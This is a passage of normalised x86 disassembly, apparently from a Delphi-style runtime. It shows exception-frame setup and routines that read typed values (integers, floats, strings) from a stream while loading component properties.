mov eax esi
call sub_416090
sub_419c10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419d1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d26
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
xor edx edx
push ebp
push sub_419d02
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d54
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41943c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4161a0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4044c4
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_419518
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4161a0
call sub_419b94
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4161a0
mov edx eax
mov eax [ rw-data ]
call sub_4167ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4162ec
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_419d30
push ebx
mov ebx eax
mov eax ebx
call sub_419e24
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_418900
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_419d54
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4036c0
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4161a0
call sub_4036c0
inc edi
dec esi
jne r-xdata
sub_419d90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403608
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_415628
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40364c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4156a0
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4155a0
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403624
test al al
jne r-xdata
sub_419e60
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_419eac
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_419eac
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0x8 ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_419efc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419f47
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b508
mov eax [ ebp - 0x4 ]
call sub_4046e4
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f4e
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
call sub_419950
sub_419f54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419ff4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_419af8
test al al
jne r-xdata
mov eax ebx
call sub_419af8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417110
jmp r-xdata
mov eax ebx
call sub_419e3c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41a8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ffb
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_417058
mov esi eax
mov eax ebx
call sub_41a8a8
jmp r-xdata
mov eax ebx
call sub_41a7f8
mov eax ebx
call sub_419af8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41aa14
mov eax ebx
call sub_41a8b0
sub_41a000
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x1 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41a020
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_4027d4
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41a000
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
xor edx edx
call sub_41b99c
call sub_4027d4
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4036c0
sub_41a080
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41a166
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41bb3c
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x1 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41a13a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x1c ] 0x200
sub_41a16b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_41a020
pop ecx
test al al
jne r-xdata
call sub_403f08
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403eb4
sub_41a190
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41a208
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov si 0xfff8
call sub_4038bc
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call sub_415b5c
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x10 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x1c ] 0x200
sub_41a20d
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_41a020
pop ecx
test al al
jne r-xdata
call sub_403f08
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403eb4
sub_41a230
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41a2ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41bb3c
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov si 0xfff2
call sub_4038bc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a2d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41a499
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x1 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b4cc
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41b4cc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41a477
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x1 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41a435
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
or [ eax + 0x1c ] 0x1
test [ ebp - 0x1 ] 0x1
jne r-xdata
push ebp
call sub_41a080
pop ecx
push ebp
call sub_41a230
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push ebp
call sub_41a190
pop ecx
mov eax [ ebp - 0x10 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403f38
jmp r-xdata
mov eax [ ebp - 0x10 ]
or [ eax + 0x1c ] 0x2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x1c ] 0xfffd
test [ ebp - 0x1 ] 0x2
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404450
retn
test [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov si 0xfff9
call sub_4038bc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4161fc
test eax eax
jge r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_416044
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_416044
sub_41a43a
push ebp
call sub_41a000
pop ecx
test al al
je r-xdata
call sub_403eb4
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x10 ]
call sub_4036c0
sub_41a4ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a51c
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41a507
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a51c
mov eax [ ebp - 0x4 ]
call sub_419c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d54
retn
sub_41a51c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419af8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41aa14
mov eax [ ebp - 0x4 ]
call sub_41a8b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4038bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41a5de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4038bc
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_419af8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a2d4
mov eax [ ebp - 0x4 ]
call sub_41a8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5e5
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41a5ec
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41b6a8
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a7f8
mov [ esp + 0xc ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_419e60
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41a62c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41b6a8
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a7f8
mov [ esp + 0x4 ] eax
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419e60
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_41a66c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41b6a8
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a7f8
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_419e60
jmp r-xdata
fild [ esp ]
add esp 0xc
pop ebx
retn
sub_41a6b8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41b6a8
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a7f8
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_419e60
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41a6f8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41b6a8
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_419950
mov al [ eax + lookup_table_41a71f ]
jmp [ eax * 4 + jump_table_41a72d ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419e60
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40451c
mov eax esi
call j_sub_4048e8#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_419e60
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404480
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404480
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404480
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404480
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41a7f8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41b6a8
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_419e60
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_419e60
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419e60
jmp r-xdata
jmp r-xdata
call sub_419950
sub_41a864
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_419e3c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41a7f8
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41b6a8
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_419e60
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41a8b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_419e3c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41b6a8
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41a7f8
mov [ edi ] eax
sub_41a8f8
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a9e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40442c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4044c4
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9f0
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403610
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404688
sub_41aa14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41abe4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403ccc
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41b4cc
xor edx edx
push ebp
push j_sub_403ccc#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4046e4
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_40493c
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403900
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4126dc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403900
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4126dc
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41ad3c
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_419e4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_419e4c
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4127d0
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41a9f8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov edi ebx
jmp r-xdata
sub_41abac
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403eb4
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_41abf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_415a04
mov ebx eax
test ebx ebx
je r-xdata
call sub_419950
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_412844
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ac3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4193e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_416044
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ac7c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41ad2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419e3c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41a6f8
